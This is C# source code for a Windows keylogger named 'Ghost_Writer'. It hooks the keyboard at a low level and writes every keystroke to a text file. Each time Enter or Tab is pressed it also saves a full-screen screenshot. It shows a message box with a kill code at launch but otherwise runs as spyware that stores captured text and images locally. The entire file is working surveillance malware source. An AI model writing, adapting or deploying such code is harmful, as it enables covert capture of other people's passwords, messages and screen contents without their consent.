using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;

namespace Ghost_Writer
{
    class Ghost_Writer
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private static LowLevelKeyboardProc _proc = HookCallBack;
        private static IntPtr _hookID = IntPtr.Zero;

        static bool CAPS;
        static bool SHIFT;

        private static String FILE_PATH = "Text_Data.txt";

        public static void Main()
        {
            //get current time
            DateTime currTime = DateTime.Now;

            //create a folder for each date
            string directory = "Image_Data";

            //check if the directory already exists, if not create it
            if(!Directory.Exists(directory))
            {
                DirectoryInfo di = Directory.CreateDirectory(directory);
            }

            //check if file path exists, if not create the file
            if (!File.Exists(FILE_PATH))
            {
                using (FileStream f = File.Create(FILE_PATH, 1024, FileOptions.Asynchronous))
                {
                    f.Flush();
                    f.Dispose();
                    f.Close();
                }
            }
            else
            {
                //if it already exists then write a new line in 
                using (StreamWriter twx = new StreamWriter(FILE_PATH, true))
                {
                    twx.WriteLine();
                }
            }

            //After the file is verified write date and newline to it
            using (StreamWriter tw = new StreamWriter(FILE_PATH, true))
            {
                tw.WriteLine(currTime.ToString());
                tw.WriteLine();
            }

            //Show kill code msg
            string kill_code = "Press Shift + Esc to quit \n\n Check: (" + Directory.GetCurrentDirectory().ToString() + ") to access files.";
            MessageBox.Show(kill_code);

            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallBack(int nCode, IntPtr wParam, IntPtr lParam)
        {
            String txt = "";
            
            if (nCode >= 0)
            {
                if (wParam == (IntPtr)WM_KEYDOWN)
                {
                    //capture the button pressed and convert it to Key format
                    Keys key = (Keys)Marshal.ReadInt32(lParam);

                    //check if a shift key was pressed down
                    if (key == Keys.RShiftKey || key == Keys.LShiftKey) { SHIFT = true; }

                    //check if caps lock was pressed, keep track of CAPS lock state
                    if (key == Keys.CapsLock && CAPS) { CAPS = false; }
                    else { CAPS = true; }

                    if (key == Keys.Return || key == Keys.Tab)
                    {
                        //record date/time
                        DateTime currTime = DateTime.Now;

                        //make string with custom format time
                        string time = currTime.Month.ToString() + "-" + currTime.Day.ToString() + "-" + currTime.Year.ToString() + " _ " + currTime.Hour.ToString() + "-" + currTime.Minute.ToString() + "-" + currTime.Second.ToString(); 

                        //
                        Rectangle bounds = new Rectangle(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                        
                        using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                        {
                            using(Graphics g = Graphics.FromImage(bitmap))
                            {
                                g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                            }
                            bitmap.Save("Image_Data//" + time + ".jpg", ImageFormat.Jpeg);
                        }


                        txt = txt + " (enter/tab) ";
                    }
                    else
                    {
                        //check that key is digit or number else check for special charaters
                        if (Char.IsLetterOrDigit(Convert.ToChar(key)) && key.ToString().Length < 2)
                        {
                            if (!SHIFT || !CAPS)
                            {
                                txt = txt + Char.ToLower(Convert.ToChar(key)).ToString();
                            }
                            else
                            {
                                txt = txt + key.ToString();
                            }
                        }
                        else
                        {
                            switch (key)
                            {
                                case Keys.Space:
                                    txt = txt + " ";
                                    break;
                                case Keys.Back:

                                    //make sure we dont run out of space
                                    if (txt.Length > 2)
                                    {
                                        txt = txt.Substring(0, txt.Length - 1);
                                    }
                                    break;
                                case Keys.D0:
                                    if (!SHIFT || !CAPS) {
                                        txt = txt + "0";
                                    }
                                    else {
                                        txt = txt + ")";
                                    }
                                    break;
                                case Keys.D1:
                                    if (!SHIFT || !CAPS) {
                                        txt = txt + "1";
                                    }
                                    else { 
                                        txt = txt + "!";
                                    }
                                    break;
                                case Keys.D2:
                                    if (!SHIFT || !CAPS) {
                                        txt = txt + "2";
                                    }
                                    else {
                                        txt = txt + "@";
                                    }
                                    break;
                                case Keys.D3:
                                    if (!SHIFT || !CAPS) {
                                        txt = txt + "3";
                                    }
                                    else { //tw.Write("#"); 
                                        txt = txt + "#";
                                    }
                                    break;
                                case Keys.D4:
                                    if (!SHIFT || !CAPS) {
                                        txt = txt + "4";
                                    }
                                    else {
                                        txt = txt + "$";
                                    }
                                    break;
                                case Keys.D5:
                                    if (!SHIFT || !CAPS) {
                                        txt = txt + "5";
                                    }
                                    else {
                                        txt = txt + "%";
                                    }
                                    break;
                                case Keys.D6:
                                    if (!SHIFT || !CAPS) {
                                        txt = txt + "6";
                                    }
                                    else {
                                        txt = txt + "^";
                                    }
                                    break;
                                case Keys.D7:
                                    if (!SHIFT || !CAPS) {
                                        txt = txt + "7";
                                    }
                                    else {
                                        txt = txt + "&";
                                    }
                                    break;
                                case Keys.D8:
                                    if (!SHIFT || !CAPS) {
                                        txt = txt + "8";
                                    }
                                    else { 
                                        txt = txt + "*";
                                    }
                                    break;
                                case Keys.D9:
                                    if (!SHIFT || !CAPS) {
                                        txt = txt + "9";
                                    }
                                    else {
                                        txt = txt + "(";
                                    }
                                    break;
                                case Keys.Oemcomma:
                                    if (!SHIFT || !CAPS) {
                                        txt = txt + ",";
                                    }
                                    else {
                                        txt = txt + "<";
                                    }
                                    break;
                                case Keys.OemPeriod:
                                    if (!SHIFT || !CAPS) {
                                        txt = txt + ".";
                                    }
                                    else { 
                                        txt = txt + ">";
                                    }
                                    break;
                                case Keys.OemQuestion:
                                    if (!SHIFT || !CAPS) {
                                        txt = txt + "/";
                                    }
                                    else { 
                                        txt = txt + "?";
                                    }
                                    break;
                                case Keys.OemSemicolon:
                                    if (!SHIFT || !CAPS) {
                                        txt = txt + ";";
                                    }
                                    else {
                                        txt = txt + ":";
                                    }
                                    break;
                                case Keys.OemQuotes:
                                    if (!SHIFT || !CAPS) {
                                        txt = txt + "'";
                                    }
                                    else {
                                        txt = txt + "\"";
                                    }
                                    break;
                                case Keys.OemOpenBrackets:
                                    if (!SHIFT || !CAPS) {
                                        txt = txt + "[";
                                    }
                                    else {
                                        txt = txt + "{";
                                    }
                                    break;
                                case Keys.OemCloseBrackets:
                                    if (!SHIFT || !CAPS) {
                                        txt = txt + "]";
                                    }
                                    else {
                                        txt = txt + "}";
                                    }
                                    break;
                                case Keys.OemPipe:
                                    if (!SHIFT || !CAPS) {
                                        txt = txt + "\\";
                                    }
                                    else {
                                        txt = txt + "|";
                                    }
                                    break;
                                case Keys.Oemtilde:
                                    if (!SHIFT || !CAPS) {
                                        txt = txt + "`";
                                    }
                                    else {
                                        txt = txt + "~";
                                    }
                                    break;
                                case Keys.OemMinus:
                                    if (!SHIFT || !CAPS) {
                                        txt = txt + "-";
                                    }
                                    else {
                                        txt = txt + "_";
                                    }
                                    break;
                                case Keys.Oemplus:
                                    if (!SHIFT || !CAPS) {
                                        txt = txt + "=";
                                    }
                                    else { 
                                        txt = txt + "+";
                                    }
                                    break;
                                case Keys.Escape: //kill code
                                    if (SHIFT)
                                    {
                                        if (Application.AllowQuit)
                                        {
                                            //end the program
                                            Application.Exit();
                                        }
                                    }
                                    break;
                            }
                        }
                    }
                }
                else if (wParam == (IntPtr)WM_KEYUP)
                {
                    //capture the button that was released and convert it to key format
                    Keys key = (Keys)Marshal.ReadInt32(lParam);

                    //Note that shift key was released
                    if (key == Keys.RShiftKey || key == Keys.LShiftKey) { SHIFT = false; }
                }
            }

            //put string of txt into file
            using (StreamWriter tw = new StreamWriter(FILE_PATH, true))
            {
                tw.Write(txt);
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}
